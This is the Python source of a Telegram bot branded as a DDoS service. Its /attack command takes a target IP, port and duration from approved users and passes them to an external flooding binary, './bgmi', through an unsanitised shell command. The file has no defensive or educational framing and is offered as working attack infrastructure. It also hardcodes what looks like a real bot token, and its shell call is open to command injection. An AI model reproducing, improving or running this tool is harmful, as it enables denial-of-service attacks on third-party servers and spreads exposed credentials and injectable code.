import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from datetime import datetime, timedelta
from collections import defaultdict

TELEGRAM_BOT_TOKEN = '7819992909:AAHn51FAfPId42gmKUT5wPmCoyC4_g9OeN0'  # Replace with your bot token
ADMIN_USER_ID = 1662672529  # Replace with your admin user ID
APPROVED_IDS_FILE = 'approved_ids.txt'
user_attack_count = defaultdict(int)
user_attack_times = defaultdict(list)
user_ban_status = {}
ban_timers = {}
user_opened_bot = set()  # Track users who opened the bot
attack_in_progress = False
cooldown_time = 10  # Cooldown in seconds
max_attacks_per_hour = 4  # Max 4 attacks per hour
duration_limit = 180  # Maximum attack duration in seconds
ban_duration = 10  # Ban duration in minutes

# Load approved IDs (users and groups) from file
def load_approved_ids():
    try:
        with open(APPROVED_IDS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_approved_ids(approved_ids):
    with open(APPROVED_IDS_FILE, 'w') as f:
        f.writelines(f"{id_}\n" for id_ in approved_ids)

approved_ids = load_approved_ids()

# Start command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_opened_bot.add(chat_id)
    message = (
        "*👿 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐆𝐎𝐃x𝐂𝐇𝐄𝐀𝐓𝐒 𝐃𝐃𝐎𝐒 👿*\n\n"
        "*/help - Show this help message*\n"
        "*OWNER :- @GODxAloneBOY*\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Help command
async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*Commands:* \n"
        "/start - Welcome message\n"
        "/approve <id> - Approve a user or group (admin only)\n"
        "/remove <id> - Remove a user or group (admin only)\n"
        "/attack <ip> <port> <time> - Launch an attack (approved users only)\n"
        "/check - List all users who used the bot (admin only)\n"
        "/checkout - List all users who opened the bot (admin only)\n"
        "/help - Show this help message"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Approve command
async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage » /approve <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    approved_ids.add(target_id)
    save_approved_ids(approved_ids)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

# Remove command
async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage » /remove <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.discard(target_id)
        save_approved_ids(approved_ids)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')

# Attack command
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args
    now = datetime.now()

    # Check if user is banned
    if user_ban_status.get(user_id, False):
        ban_start_time = ban_timers[user_id]
        elapsed_minutes = (now - ban_start_time).seconds // 60
        if elapsed_minutes >= ban_duration:
            user_ban_status[user_id] = False
            await context.bot.send_message(chat_id=chat_id, text="*✅ Your ban has expired. You can now use the bot.*", parse_mode='Markdown')
        else:
            remaining_ban = ban_duration - elapsed_minutes
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You are banned. Try again in {remaining_ban} minutes.*", parse_mode='Markdown')
            return

    # Check if user is approved
    if str(chat_id) not in approved_ids and user_id not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    # Handle invalid /attack usage
    if len(args) != 3:
        user_attack_count[user_id] += 1
        if user_attack_count[user_id] >= max_attacks_per_hour:
            user_ban_status[user_id] = True
            ban_timers[user_id] = now
            user_attack_count[user_id] = 0  # Reset count after banning
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You are banned for {ban_duration} minutes due to spamming invalid /attack commands.*", parse_mode='Markdown')
            return
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid /attack command. Use /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time = args

    if int(time) > duration_limit:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Maximum allowed duration is {duration_limit} seconds.*", parse_mode='Markdown')
        return

    # Attack launch message
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 ✅*\n"
        f"*⭐ Target » {ip}*\n"
        f"*⭐ Port » {port}*\n"
        f"*⭐ Time » {time} seconds*\n"
        f"*https://t.me/+03wLVBPurPk2NWRl*\n"
    ), parse_mode='Markdown')

    # Run attack asynchronously
    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

# Run attack process
async def run_attack(chat_id, ip, port, time, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*\n*SEND FEEDBACK TO OWNER*\n*@GODxAloneBOY*", parse_mode='Markdown')

# Check command
async def check(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Admin permission required.*", parse_mode='Markdown')
        return

    users = "\n".join(f"User ID: {user_id}" for user_id in user_attack_times)
    message = users or "*No users have used the bot yet.*"
    await context.bot.send_message(chat_id=chat_id, text=f"*Users who used the bot:*\n{message}", parse_mode='Markdown')

# Checkout command
async def checkout(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Admin permission required.*", parse_mode='Markdown')
        return

    users = "\n".join(f"User ID: {user}" for user in user_opened_bot)
    message = users or "*No users have opened the bot yet.*"
    await context.bot.send_message(chat_id=chat_id, text=f"*Users who opened the bot:*\n{message}", parse_mode='Markdown')

# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("check", check))
    application.add_handler(CommandHandler("checkout", checkout))
    application.add_handler(CommandHandler("help", help_command))
    application.run_polling()

if __name__ == '__main__':
    main()
